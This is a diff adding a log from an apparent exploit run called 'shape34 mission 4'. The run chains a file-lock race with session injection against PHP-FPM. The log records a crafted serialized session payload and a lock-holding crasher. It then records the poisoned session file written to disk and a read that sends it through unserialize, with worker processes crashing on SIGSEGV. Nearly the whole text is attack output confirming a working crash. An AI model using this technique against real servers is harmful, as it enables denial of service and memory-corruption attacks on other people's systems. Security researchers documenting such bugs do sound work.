@@ -1,0 +1,19 @@
+======================================================================
+shape34 mission 4 — flock-drop timing + zero4 session injection
+sid=s342e39e9106f480b3f2f46 session file=/tmp/s34_fpm/sess/sess_s342e39e9106f480b3f2f46
+======================================================================
+[payload] 18338 bytes: q|a:1020:{...O:19:"Shape34_JobEnvelope":1:{s:4:"jobs";s:8167:"A*8160";}...}
+[P0] seed: HTTP/1.1 200 OK b'35\r\nREAD-OK pid=1962528 sapi=fpm-fcgi handler=php keys=v\n\r\n0' (0.007s)
+[P0] file after seed: 14 bytes: b'v|s:5:"legit";'
+[P1] holder (23-byte C: crasher, dies holding flock):
+     status='HTTP/1.1 503 Service Unavailable' dt=0.011s body[:80]=b'<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><head>\n<title>503 Servi'
+[P2] writer: polls=1 eagain=0 t_first_blocked=None t_acq=1792873717.539295 fail=None
+[P2] poison on disk: 18338 bytes head=b'q|a:1020:{i:0;i:1;i:1;i:1;i:2;i:1;i:3;i:1;i:4;i:1;i:5;i:1;i:' tail=b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"";}i:9998;i:5;}'
+[P3] poisoned read on the same sid (session decode = unserialize):
+     status='HTTP/1.1 503 Service Unavailable' dt=0.018s body[:60]=b'<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n<html><he'  <-- KILL-MANIFEST
+
+--- FPM error log kill lines (this run):
+     [24-Oct-2026 15:28:37] WARNING: [pool www] child 1962453 exited on signal 11 (SIGSEGV) after 246.997142 seconds from start
+     [24-Oct-2026 15:28:38] WARNING: [pool www] child 1962528 exited on signal 11 (SIGSEGV) after 239.646736 seconds from start
+
+DONE shape34_fpm_chain sid=s342e39e9106f480b3f2f46
